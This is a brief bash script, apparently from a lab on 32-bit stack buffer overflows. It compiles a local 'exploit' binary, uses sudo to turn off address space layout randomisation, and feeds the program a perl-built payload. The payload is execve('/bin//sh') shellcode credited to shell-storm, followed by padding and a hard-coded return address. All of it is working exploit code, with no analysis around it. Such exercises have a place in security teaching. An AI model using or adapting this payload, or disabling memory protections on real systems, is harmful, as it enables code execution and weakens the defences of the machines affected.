#!/bin/bash

# Send shellcode string to executable.
# Shellcode: http://www.shell-storm.org/shellcode/files/shellcode-841.php

# Build exploit executable.
make > /dev/null 2>&1

# Disable ASLR:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space > /dev/null 2>&1

./exploit $(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"; print "a"x23; print "\x40\xf7\xff\xbf"')
